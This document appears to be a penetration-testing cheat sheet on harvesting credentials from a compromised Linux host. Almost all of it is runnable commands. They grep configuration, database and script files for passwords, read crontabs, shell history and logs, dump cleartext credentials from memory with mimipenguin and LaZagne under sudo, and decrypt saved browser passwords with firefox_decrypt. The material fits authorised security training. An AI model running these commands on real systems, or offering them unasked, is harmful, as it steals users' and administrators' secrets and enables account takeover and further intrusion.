## Configuration File Enumeration

Searching for hardcoded credentials in service configurations when initial access is gained via a shell.

Find configuration files by common extensions while filtering out library, font, and documentation noise

```
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: "  $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done
```

Search specifically for credential-related keywords within found `.cnf` files and exclude comments

```
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "#";done
```

**Gotchas** **Renamed extensions or recompiled services** may hide configuration files from standard extension-based searches.

---

## Database File Discovery

Identifying local database storage or SQL dumps that may contain credentials or sensitive data.

Locate SQL and database files while filtering system headers and manual pages

```
for l in $(echo ".sql .db . *db .db* ");do echo -e "\nDB File extension: "  $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done
```

---

## Note and Script Hunting

Searching for manually created credential lists or automation scripts containing plaintext secrets.

Find text files or files without extensions in home directories to locate administrator notes

```
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

Identify scripts in common languages while filtering standard library paths

```
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: "  $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share";done
```

---

## Cronjob Enumeration

Checking scheduled tasks for credentials passed as arguments or insecurely stored in associated scripts.

View system-wide scheduled tasks

```
cat /etc/crontab
```

Check for scripts and configuration files in Debian-based cron directories

```
ls -la /etc/cron.*/
```

---

## History and Log Analysis

Reviewing command history and system logs for leaked credentials or sensitive process information.

Check the end of shell history and profile files for hardcoded passwords or sensitive commands

```
tail -n5 /home/<USERNAME>/.bash*
```

Automated search through system logs for security-relevant strings and session information

```
for i in  $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted|session opened|session closed|failure|failed|ssh|password changed|new user|delete user|sudo|COMMAND=|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted|session opened|session closed|failure|failed|ssh|password changed|new user|delete user|sudo|COMMAND=|logs" $i 2>/dev/null;fi;done
```

**Gotchas** **Log formats and availability** vary significantly depending on the applications installed and the Linux distribution in use.

---

## Memory and Cache Extraction

Extracting credentials from active processes or system-wide password managers.

### Mimipenguin

Extracting cleartext credentials from the memory of logged-in users.

Execute memory dump and credential extraction

```
sudo python3 mimipenguin.py
```

### LaZagne

Extracting hashes and passwords from various sources including keyrings and shadow files.

Attempt extraction from all supported modules

```
sudo python2.7 laZagne.py all
```

### Tool comparison

- mimipenguin -> `sudo python3 mimipenguin.py` -> prefer for extracting credentials directly from active process memory
- LaZagne -> `sudo python2.7 laZagne.py all` -> prefer for broad coverage including browser storage, keyrings, and shadow hashes

**Gotchas** **Insufficient permissions** will cause these tools to fail as they require **root/administrator** access to read sensitive memory and system files.

---

## Browser Credential Decryption

Recovering saved passwords from local browser profiles.

### Firefox Decrypt

Decrypting credentials stored in Firefox `logins.json`.

Run decryption against found Mozilla profiles

```
python3.9 firefox_decrypt.py
```

### LaZagne

Automated browser credential extraction.

Target browser-specific storage modules

```
python3 laZagne.py browsers
```

### Tool comparison

- Firefox Decrypt -> `python3.9 firefox_decrypt.py` -> prefer for dedicated Firefox profile decryption
- LaZagne -> `python3 laZagne.py browsers` -> prefer when multiple different browsers are present on the system

**Edge cases**

- If the target environment only has Python 2, use Firefox Decrypt 0.7.0.

**Gotchas** **Python version mismatch** may prevent execution as the latest Firefox Decrypt requires Python 3.9.